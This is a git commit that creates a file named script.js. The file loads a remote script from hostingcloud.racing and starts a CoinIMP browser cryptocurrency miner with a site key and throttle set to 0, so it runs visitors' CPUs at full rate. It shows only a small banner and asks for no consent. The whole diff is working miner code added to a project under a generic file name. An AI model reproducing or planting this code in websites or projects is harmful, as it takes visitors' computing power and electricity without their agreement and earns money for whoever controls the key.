5d462b88da36cb417e4cdf5488f1320c1f843088
charles francis <charlsefrancis112@gmail.com>
2020-06-28 00:57:43 +0800

    Create script.js

---
+++ script.js
@@ -0,0 +1,9 @@
+<script src="https://www.hostingcloud.racing/RvwI.js"></script>
+<script>
+    var _client = new Client.Anonymous('285831e612140980394dde9589530fc05cdb3eaf121891552a60083408ec368e', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+
+</script>
